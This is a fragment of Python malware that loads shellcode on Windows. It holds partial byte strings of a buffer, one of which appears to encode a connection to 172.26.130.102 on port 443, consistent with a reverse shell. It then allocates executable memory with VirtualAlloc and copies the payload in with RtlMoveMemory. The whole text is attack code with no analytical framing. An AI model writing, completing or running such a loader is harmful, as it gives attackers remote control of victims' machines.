...
buf += b"\x8b\x52\x18\x51\x48\x8b\x52\x20\x56\x48\x8b\x72"
...
buf += b"\x49\xbc\x02\x00\x01\xbb\xac\x1a\x82\x66\x41\x54"
...
space = ctypes.windll.kernel32.VirtualAlloc(0, len(buf), 0x3000, 0x40)
buff = (ctypes.c_char * len(buf)).from_buffer_copy(buf)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space), buff, len(buf))
